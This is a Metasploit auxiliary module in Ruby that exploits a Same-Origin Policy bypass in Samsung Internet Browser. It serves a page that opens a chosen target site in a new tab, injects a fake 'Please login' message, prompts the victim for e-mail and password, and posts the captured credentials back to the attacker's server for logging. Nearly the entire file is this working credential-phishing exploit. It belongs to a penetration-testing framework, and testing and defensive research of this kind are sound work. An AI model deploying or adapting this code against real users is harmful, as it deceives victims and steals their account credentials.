##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpServer

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name'           => "Samsung Internet Browser SOP Bypass",
        'Description'    => %q(
          This module takes advantage of a Same-Origin Policy (SOP) bypass vulnerability in the
          Samsung Internet Browser, a popular mobile browser shipping with Samsung Android devices.
          It initiates a server-redirect to a child tab using the document.body.innerHTML
          function, which causes the child tab to create a fake pop-up. This pop-up prompts the user
          for a username and password which appears to originate from the targeted URL's domain. Once
          entered, the credentials are passed to the parent tab as well as stored locally.
        ),
        'License'        => MSF_LICENSE,
        'Author'         => [
          'Dhiraj Mishra',
        ],
        'References'     => [
        ['URL', 'http://fr.0day.today/exploit/description/28434'],
        ],
        'DisclosureDate' => "Nov 08 2017",
        'Actions'        => [[ 'WebServer' ]],
        'PassiveActions' => [ 'WebServer' ],
        'DefaultAction'  => 'WebServer'
      )
    )

  register_options([
      OptString.new('TARGET_URL', [
        true,
        "The URL to spoof origin from.",
        'http://example.com'
      ]),
      OptString.new('CUSTOM_HTML', [
        true,
        "HTML to display to the victim.",
        'This page has moved. Please <a href="#">click here</a> redirect your browser.'
      ]),

    ])
  end

  def run
    exploit # start http server
  end

  def setup
    @html = <<-EOS
        <html>
        <meta charset="UTF-8">
        <script>
        function go(){
          var x = window.open('#{datastore['TARGET_URL']}');
          setTimeout(function(){
            x.document.body.innerHTML='<h1>Please login</h1>'+
            '<p>Oops, something went wrong. Please re-enter your username/e-mail address and password.</p>';
            a=x.prompt('E-mail','');
            b=x.prompt('Password','');
            var creds=JSON.stringify({'user':a,'pass':b});
            var xmlhttp = new XMLHttpRequest;
              xmlhttp.open('POST', window.location, true);
              xmlhttp.send(creds);
            }, 3000);
          }
        </script>
        <body onclick="go()">
        #{datastore['CUSTOM_HTML']}
        </body></html>
      EOS
  end

  # TODO: This does not actually save the credential, since it's gathered from the user
  # and there's no real solid way to associate it with the domain part of the target_url.
  # Suggestions welcome if this should be saved with store_loot or just make a guess on the
  # target.
  def collect_data(request)
    creds = JSON.parse(request.body)
    u = creds['user']
    p = creds['pass']
    print_good("#{cli.peerhost}: Collected credential for '#{datastore['TARGET_URL']}' #{u}:#{p}")
  end

  def on_request_uri(cli, request)
    case request.method.downcase
    when 'get' # initial connection
      print_status("#{cli.peerhost}: Request '#{request.method} #{request.uri}'")
      print_status("#{cli.peerhost}: Attempting to spoof origin for #{datastore['TARGET_URL']}")
      send_response(cli, @html)
    when 'post' # must have fallen for it
      collect_data(request)
    else
      print_error("#{cli.peerhost}: Unhandled method: #{request.method}")
    end
  end

end
